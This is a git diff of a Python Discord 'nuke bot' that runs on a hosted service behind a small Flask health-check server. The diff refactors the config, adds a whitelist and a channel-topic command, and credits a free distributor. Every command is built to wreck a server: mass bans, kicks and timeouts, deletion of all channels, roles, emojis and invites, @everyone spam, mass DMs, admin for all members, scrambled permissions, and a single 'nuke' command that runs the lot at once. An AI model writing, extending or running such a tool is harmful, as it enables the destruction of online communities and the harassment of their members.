@@ -11,116 +11,122 @@ import sys
 import traceback
 import time
 import os
-from flask import Flask
 import threading
-
-# ===== CONFIG =====
-class Config:
-    TOKEN = os.getenv('DISCORD_TOKEN', '')
-    PREFIX = os.getenv('BOT_PREFIX', '!')
-    WHITELIST = []
-    SPAM_MESSAGE = "@everyone"
-    SPAM_COUNT = 10
-    TEXT_TO_SPEECH = False
-    DM_MESSAGE = "THE SERVER GOT NUKED"
-    CHANNEL_NAME = "nuked"
-    CHANNELS_COUNT = 10
-    NEW_CHANNEL_NAME = "nuked"
-    VOICE_CHANNELS_COUNT = 10
-    VOICE_CHANNEL_NAME = "NUKED"
-    CATEGORY_NAME = "NUKED"
-    CATEGORIES_COUNT = 5
-    THREAD_COUNT = 5
-    THREAD_NAME = "nuked"
-    NSFW_CHANNEL_NAME = "nuked"
-    SLOWMODE_DURATION = 300
-    ROLE_NAME = "nuked"
-    ROLES_COUNT = 10
-    NEW_ROLE_NAME = "nuked"
-    ADMIN_ROLE_NAME = "ADMIN"
-    SERVER_NAME = "NUKED SERVER"
-    SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"
-    NICKNAME = "NUKED"
-    TIMEOUT_DURATION = 28
-    WEBHOOK_NAME = "NUKED"
-    WEBHOOK_COUNT = 10
-    WEBHOOK_RENAME = "NUKED"
-    INVITE_COUNT = 10
-    PIN_SPAM_COUNT = 5
-    MOVE_VOICE_CHANNEL_NAME = "LOSERS"
-    CHAOS_PERMISSIONS = [True, False, None]
+from flask import Flask
+from config import Config
 
 config = Config()
 
 # Check if token is set
 if not config.TOKEN:
     print("❌ Error: DISCORD_TOKEN environment variable is not set!")
+    print("Please set your bot token in Render environment variables.")
     sys.exit(1)
 
-print(f"🔑 Token loaded: {config.TOKEN[:10]}...")
+print(f"🔑 Token loaded: {config.TOKEN[:10]}... (hidden for security)")
 
-# ===== FLASK WEB SERVER (Keeps Render happy) =====
+# Create Flask app for health checks
 app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "Bot is running!"
+    return "🤖 Discord Bot is running!"
 
 @app.route('/health')
 def health():
     return "OK", 200
 
-def run_flask():
+def run_web_server():
     port = int(os.environ.get('PORT', 10000))
+    print(f"🌐 Starting web server on port {port}...")
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
-# Start Flask in background thread
-flask_thread = threading.Thread(target=run_flask, daemon=True)
-flask_thread.start()
-print("🌐 Web server started")
+# Start web server in background thread
+web_thread = threading.Thread(target=run_web_server, daemon=True)
+web_thread.start()
+print("🌐 Web server thread started")
 
-# ===== DISCORD BOT =====
+# Set up bot with proper intents
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)
 bot.remove_command("help")
 
+def is_whitelisted(ctx):
+    if not config.WHITELIST:
+        return True
+    return ctx.author.id in config.WHITELIST
+
+async def download_image(url):
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    return await response.read()
+                return None
+    except Exception as e:
+        print(f"Error downloading image: {e}")
+        return None
+
 @bot.event
 async def on_ready():
     print(f'✅✅✅ BOT IS ONLINE! ✅✅✅')
-    print(f'Logged in as {bot.user}')
-    print(f'Bot ID: {bot.user.id}')
-    print(f'Prefix: {config.PREFIX}')
+    print(f'✅ Logged in as {bot.user} (ID: {bot.user.id})')
+    print(f'✅ Bot is ready to use!')
+    print(f'✅ Prefix: {config.PREFIX}')
+    print(f'✅ Whitelist: {config.WHITELIST if config.WHITELIST else "Anyone can use"}')
     print('-' * 50)
-    await bot.change_presence(activity=discord.Game(name=f"{config.PREFIX}help"))
+    
+    # Set bot status
+    await bot.change_presence(activity=discord.Game(name=f"{config.PREFIX}help | Nuke Bot"))
 
 @bot.event
 async def on_command(ctx):
-    try:
-        await ctx.message.delete()
-    except:
-        pass
+    if is_whitelisted(ctx):
+        await asyncio.sleep(0.1)
+        try:
+            await ctx.message.delete()
+        except:
+            pass
 
-@bot.command()
-async def ping(ctx):
-    await ctx.send(f"Pong! {round(bot.latency * 1000)}ms")
+@bot.check
+async def globally_check_dm(ctx):
+    return ctx.guild is not None
 
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound):
+        return
+    print(f"Error in command {ctx.command}: {error}")
+    traceback.print_exc()
+
+@bot.event
+async def on_connect():
+    print("🔌 Bot connected to Discord!")
+
+@bot.event
+async def on_disconnect():
+    print("🔌 Bot disconnected from Discord!")
+
+@bot.event
+async def on_resumed():
+    print("🔄 Bot resumed connection!")
+
+# ========== ALL COMMANDS ==========
 @bot.command()
 async def rserver(ctx):
+    if not is_whitelisted(ctx): return
     await ctx.guild.edit(name=config.SERVER_NAME)
 
 @bot.command()
 async def rservericon(ctx):
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(config.SERVER_ICON_URL) as response:
-                if response.status == 200:
-                    icon_data = await response.read()
-                    await ctx.guild.edit(icon=icon_data)
-    except:
-        pass
+    if not is_whitelisted(ctx): return
+    icon_image = await download_image(config.SERVER_ICON_URL)
+    if icon_image:
+        await ctx.guild.edit(icon=icon_image)
 
 @bot.command()
 async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 50))
     for i in range(count):
         try:
@@ -131,6 +137,7 @@ async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
 
 @bot.command()
 async def cvoice(ctx, count: int = config.VOICE_CHANNELS_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 50))
     for i in range(count):
         try:
@@ -141,6 +148,7 @@ async def cvoice(ctx, count: int = config.VOICE_CHANNELS_COUNT):
 
 @bot.command()
 async def ccategory(ctx, count: int = config.CATEGORIES_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 10))
     for i in range(count):
         try:
@@ -151,6 +159,7 @@ async def ccategory(ctx, count: int = config.CATEGORIES_COUNT):
 
 @bot.command()
 async def cthread(ctx, count: int = config.THREAD_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 10))
     for channel in ctx.guild.text_channels:
         for i in range(count):
@@ -162,6 +171,7 @@ async def cthread(ctx, count: int = config.THREAD_COUNT):
 
 @bot.command()
 async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 50))
     for i in range(count):
         try:
@@ -173,6 +183,7 @@ async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
 
 @bot.command()
 async def dchannels(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
@@ -186,6 +197,7 @@ async def dchannels(ctx):
 
 @bot.command()
 async def dcategory(ctx):
+    if not is_whitelisted(ctx): return
     for category in ctx.guild.categories:
         try:
             await category.delete()
@@ -195,6 +207,7 @@ async def dcategory(ctx):
 
 @bot.command()
 async def rchannels(ctx):
+    if not is_whitelisted(ctx): return
     for i, channel in enumerate(ctx.guild.channels):
         try:
             await channel.edit(name=f"{config.NEW_CHANNEL_NAME}")
@@ -204,6 +217,7 @@ async def rchannels(ctx):
 
 @bot.command()
 async def nsfwall(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.text_channels:
         try:
             await channel.edit(nsfw=True)
@@ -212,7 +226,19 @@ async def nsfwall(ctx):
             pass
 
 @bot.command()
+async def rtopics(ctx):
+    if not is_whitelisted(ctx): return
+    topics = ["Nuked", "Destroyed", "Anarchy", "Chaos", "RIP"]
+    for channel in ctx.guild.text_channels:
+        try:
+            await channel.edit(topic=random.choice(topics))
+            await asyncio.sleep(0.01)
+        except:
+            pass
+
+@bot.command()
 async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
+    if not is_whitelisted(ctx): return
     seconds = max(0, min(seconds, 21600))
     for channel in ctx.guild.text_channels:
         try:
@@ -223,6 +249,7 @@ async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
 
 @bot.command()
 async def croles(ctx, count: int = config.ROLES_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 50))
     for i in range(count):
         try:
@@ -233,6 +260,7 @@ async def croles(ctx, count: int = config.ROLES_COUNT):
 
 @bot.command()
 async def droles(ctx):
+    if not is_whitelisted(ctx): return
     for role in ctx.guild.roles:
         if role.name != "@everyone" and not role.managed:
             try:
@@ -243,16 +271,20 @@ async def droles(ctx):
 
 @bot.command()
 async def rroles(ctx):
+    if not is_whitelisted(ctx): return
+    i = 0
     for role in ctx.guild.roles:
         if role.name != "@everyone":
             try:
                 await role.edit(name=f"{config.NEW_ROLE_NAME}")
+                i += 1
                 await asyncio.sleep(0.01)
             except:
                 pass
 
 @bot.command()
 async def adminall(ctx):
+    if not is_whitelisted(ctx): return
     try:
         admin_role = await ctx.guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
         for member in ctx.guild.members:
@@ -266,6 +298,7 @@ async def adminall(ctx):
 
 @bot.command()
 async def rnickall(ctx):
+    if not is_whitelisted(ctx): return
     for member in ctx.guild.members:
         try:
             await member.edit(nick=config.NICKNAME)
@@ -275,6 +308,7 @@ async def rnickall(ctx):
 
 @bot.command()
 async def demoteall(ctx):
+    if not is_whitelisted(ctx): return
     for member in ctx.guild.members:
         try:
             roles_to_remove = [role for role in member.roles if role.name != "@everyone"]
@@ -286,6 +320,7 @@ async def demoteall(ctx):
 
 @bot.command()
 async def moveall(ctx):
+    if not is_whitelisted(ctx): return
     try:
         vc = await ctx.guild.create_voice_channel(config.MOVE_VOICE_CHANNEL_NAME)
         for member in ctx.guild.members:
@@ -300,6 +335,7 @@ async def moveall(ctx):
 
 @bot.command()
 async def disconnectall(ctx):
+    if not is_whitelisted(ctx): return
     for member in ctx.guild.members:
         if member.voice:
             try:
@@ -310,6 +346,7 @@ async def disconnectall(ctx):
 
 @bot.command()
 async def banall(ctx):
+    if not is_whitelisted(ctx): return
     for member in ctx.guild.members:
         if member != ctx.author and member != bot.user:
             try:
@@ -320,6 +357,7 @@ async def banall(ctx):
 
 @bot.command()
 async def unbanall(ctx):
+    if not is_whitelisted(ctx): return
     async for entry in ctx.guild.bans():
         try:
             await ctx.guild.unban(entry.user)
@@ -329,6 +367,7 @@ async def unbanall(ctx):
 
 @bot.command()
 async def kickall(ctx):
+    if not is_whitelisted(ctx): return
     for member in ctx.guild.members:
         if member != ctx.author and member != bot.user:
             try:
@@ -339,6 +378,7 @@ async def kickall(ctx):
 
 @bot.command()
 async def timeoutall(ctx):
+    if not is_whitelisted(ctx): return
     duration = min(config.TIMEOUT_DURATION, 28)
     for member in ctx.guild.members:
         if member != ctx.author and member != bot.user:
@@ -350,6 +390,7 @@ async def timeoutall(ctx):
 
 @bot.command()
 async def untimeoutall(ctx):
+    if not is_whitelisted(ctx): return
     for member in ctx.guild.members:
         try:
             await member.timeout(None)
@@ -359,6 +400,7 @@ async def untimeoutall(ctx):
 
 @bot.command()
 async def spam(ctx, count: int = config.SPAM_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 50))
     for _ in range(count):
         try:
@@ -369,6 +411,7 @@ async def spam(ctx, count: int = config.SPAM_COUNT):
 
 @bot.command()
 async def mspam(ctx, count: int = config.SPAM_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 20))
     for channel in ctx.guild.text_channels:
         for _ in range(count):
@@ -380,6 +423,7 @@ async def mspam(ctx, count: int = config.SPAM_COUNT):
 
 @bot.command()
 async def purge(ctx):
+    if not is_whitelisted(ctx): return
     try:
         await ctx.channel.purge(limit=None)
     except:
@@ -387,6 +431,7 @@ async def purge(ctx):
 
 @bot.command()
 async def mpurge(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.text_channels:
         try:
             await channel.purge(limit=None)
@@ -396,6 +441,7 @@ async def mpurge(ctx):
 
 @bot.command()
 async def rpins(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.text_channels:
         try:
             pins = await channel.pins()
@@ -410,6 +456,7 @@ async def rpins(ctx):
 
 @bot.command()
 async def cwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 10))
     for i in range(count):
         try:
@@ -420,6 +467,7 @@ async def cwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
 
 @bot.command()
 async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 5))
     for channel in ctx.guild.text_channels:
         for i in range(count):
@@ -431,6 +479,7 @@ async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
 
 @bot.command()
 async def dwebhooks(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.text_channels:
         try:
             webhooks = await channel.webhooks()
@@ -445,6 +494,7 @@ async def dwebhooks(ctx):
 
 @bot.command()
 async def rwebhooks(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.text_channels:
         try:
             webhooks = await channel.webhooks()
@@ -459,6 +509,7 @@ async def rwebhooks(ctx):
 
 @bot.command()
 async def cinvites(ctx, count: int = config.INVITE_COUNT):
+    if not is_whitelisted(ctx): return
     count = max(1, min(count, 10))
     for channel in ctx.guild.text_channels:
         for _ in range(count):
@@ -470,6 +521,7 @@ async def cinvites(ctx, count: int = config.INVITE_COUNT):
 
 @bot.command()
 async def dinvites(ctx):
+    if not is_whitelisted(ctx): return
     invites = await ctx.guild.invites()
     for invite in invites:
         try:
@@ -480,6 +532,7 @@ async def dinvites(ctx):
 
 @bot.command()
 async def demojis(ctx):
+    if not is_whitelisted(ctx): return
     for emoji in ctx.guild.emojis:
         try:
             await emoji.delete()
@@ -489,6 +542,7 @@ async def demojis(ctx):
 
 @bot.command()
 async def dstickers(ctx):
+    if not is_whitelisted(ctx): return
     for sticker in ctx.guild.stickers:
         try:
             await sticker.delete()
@@ -498,6 +552,7 @@ async def dstickers(ctx):
 
 @bot.command()
 async def dmall(ctx):
+    if not is_whitelisted(ctx): return
     for member in ctx.guild.members:
         if member != bot.user:
             try:
@@ -508,6 +563,7 @@ async def dmall(ctx):
 
 @bot.command()
 async def chaoschannels(ctx):
+    if not is_whitelisted(ctx): return
     channels = list(ctx.guild.channels)
     random.shuffle(channels)
     for position, channel in enumerate(channels):
@@ -519,6 +575,7 @@ async def chaoschannels(ctx):
 
 @bot.command()
 async def chaosroles(ctx):
+    if not is_whitelisted(ctx): return
     roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
     random.shuffle(roles)
     for position, role in enumerate(roles, start=1):
@@ -530,6 +587,7 @@ async def chaosroles(ctx):
 
 @bot.command()
 async def chaoschannelperms(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.channels:
         for role in ctx.guild.roles:
             try:
@@ -544,6 +602,7 @@ async def chaoschannelperms(ctx):
 
 @bot.command()
 async def chaosroleperms(ctx):
+    if not is_whitelisted(ctx): return
     for role in ctx.guild.roles:
         if role.name != "@everyone":
             try:
@@ -556,6 +615,7 @@ async def chaosroleperms(ctx):
 
 @bot.command()
 async def lockdown(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.channels:
         try:
             await channel.set_permissions(ctx.guild.default_role, send_messages=False)
@@ -565,6 +625,7 @@ async def lockdown(ctx):
 
 @bot.command()
 async def unlockall(ctx):
+    if not is_whitelisted(ctx): return
     for channel in ctx.guild.channels:
         try:
             await channel.set_permissions(ctx.guild.default_role, send_messages=None)
@@ -574,9 +635,18 @@ async def unlockall(ctx):
 
 @bot.command()
 async def nuke(ctx):
+    if not is_whitelisted(ctx): return
+    
     guild = ctx.guild
+    
     tasks = []
     tasks.append(guild.edit(name=config.SERVER_NAME))
+
+    if config.SERVER_ICON_URL:
+        icon_image = await download_image(config.SERVER_ICON_URL)
+        if icon_image:
+            tasks.append(guild.edit(icon=icon_image))
+
     tasks.extend(channel.delete() for channel in guild.channels)
     tasks.extend(role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed)
     tasks.extend(sticker.delete() for sticker in guild.stickers)
@@ -596,6 +666,7 @@ async def nuke(ctx):
         if config.DM_MESSAGE:
             tasks.append(member.send(config.DM_MESSAGE))
         if config.TIMEOUT_DURATION:
+            from datetime import timedelta
             tasks.append(member.timeout(timedelta(days=config.TIMEOUT_DURATION)))
     
     await asyncio.gather(*tasks, return_exceptions=True)
@@ -607,7 +678,17 @@ async def nuke(ctx):
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
+async def whitelist(ctx):
+    if not is_whitelisted(ctx): return
+    message = "Whitelisted Users:\n" + "\n".join(str(user_id) for user_id in config.WHITELIST)
+    try:
+        await ctx.author.send(message)
+    except:
+        pass
+
+@bot.command()
 async def kill(ctx):
+    if not is_whitelisted(ctx): return
     await bot.close()
 
 @bot.command(name='help')
@@ -618,29 +699,113 @@ async def help(ctx):
         color=discord.Color.purple(),
         timestamp=datetime.now()
     )
+
     categories = {
-        "🔨 Moderation": ["banall", "unbanall", "kickall", "timeoutall", "untimeoutall", "rnickall"],
-        "📁 Channels": ["ccategory", "cchannels", "chaoschannels", "chaoschannelperms", "dcategory", "dchannels", "rchannels", "cthread", "cvoice", "slowmodeall", "lockdown", "unlockall", "moveall", "disconnectall"],
-        "🎭 Roles": ["adminall", "croles", "chaosroles", "chaosroleperms", "droles", "rroles", "demoteall"],
-        "🔗 Invites/Webhooks": ["cinvites", "dinvites", "cwebhooks", "dwebhooks", "mwebhooks", "rwebhooks"],
-        "🖼️ Server": ["rserver", "rservericon", "rpins", "cnsfw", "nsfwall", "demojis", "dstickers"],
-        "💬 Messages": ["purge", "mpurge", "mspam", "spam", "dmall"],
-        "💥 Destructive": ["nuke"],
-        "🧩 Bot": ["kill", "ping"]
+        "🔨 Moderation": [
+            "`banall`",
+            "`unbanall`",
+            "`kickall`",
+            "`timeoutall`",
+            "`untimeoutall`",
+            "`rnickall`",
+        ],
+        "📁 Channels": [
+            "`ccategory`",
+            "`cchannels`",
+            "`chaoschannels`",
+            "`chaoschannelperms`",
+            "`dcategory`",
+            "`dchannels`",
+            "`rchannels`",
+            "`cthread`",
+            "`cvoice`",
+            "`slowmodeall`",
+            "`lockdown`",
+            "`unlockall`",
+            "`moveall`",
+            "`disconnectall`",
+            "`rtopics`",
+        ],
+        "🎭 Roles": [
+            "`adminall`",
+            "`croles`",
+            "`chaosroles`",
+            "`chaosroleperms`",
+            "`droles`",
+            "`rroles`",
+            "`demoteall`",
+        ],
+        "🔗 Invites / Webhooks": [
+            "`cinvites`",
+            "`dinvites`",
+            "`cwebhooks`",
+            "`dwebhooks`",
+            "`mwebhooks`",
+            "`rwebhooks`",
+        ],
+        "🖼️ Server": [
+            "`rserver`",
+            "`rservericon`",
+            "`rpins`",
+            "`cnsfw`",
+            "`nsfwall`",
+            "`demojis`",
+            "`dstickers`",
+        ],
+        "💬 Messages": [
+            "`purge`",
+            "`mpurge`",
+            "`mspam`",
+            "`spam`",
+            "`dmall`",
+        ],
+        "💥 Destructive": [
+            "`nuke`",
+        ],
+        "🧩 Bot": [
+            "`kill`",
+            "`whitelist`",
+        ],
+        "\u200b": [
+            "-# Thanks to [Vexi](<https://discord.com/users/1421939463164133590>), this product is brought to you for free! 🎀"
+        ]
     }
+
     for category, commands in categories.items():
         embed.add_field(
             name=category,
-            value="\n".join(f"`{cmd}`" for cmd in commands),
+            value="\n".join(commands),
             inline=False
         )
+
     await ctx.send(embed=embed)
 
-# ===== RUN THE BOT =====
+# ========== RUN THE BOT ==========
 if __name__ == "__main__":
     print("🚀 Starting bot...")
+    
+    # Add a small delay before connecting
+    time.sleep(2)
+    
     try:
-        bot.run(config.TOKEN, reconnect=True)
+        print("🔄 Attempting to connect to Discord...")
+        bot.run(config.TOKEN)
+    except discord.LoginFailure:
+        print("❌ Error: Invalid Discord token!")
+        print("Please check your DISCORD_TOKEN environment variable.")
+        sys.exit(1)
+    except discord.HTTPException as e:
+        print(f"❌ HTTP Error: {e}")
+        if e.status == 429:
+            print("⚠️ Rate limited! Waiting 60 seconds...")
+            time.sleep(60)
+            # Retry
+            try:
+                bot.run(config.TOKEN)
+            except:
+                print("❌ Failed again. Exiting.")
+                sys.exit(1)
     except Exception as e:
         print(f"❌ Error: {e}")
         traceback.print_exc()
+        sys.exit(1)
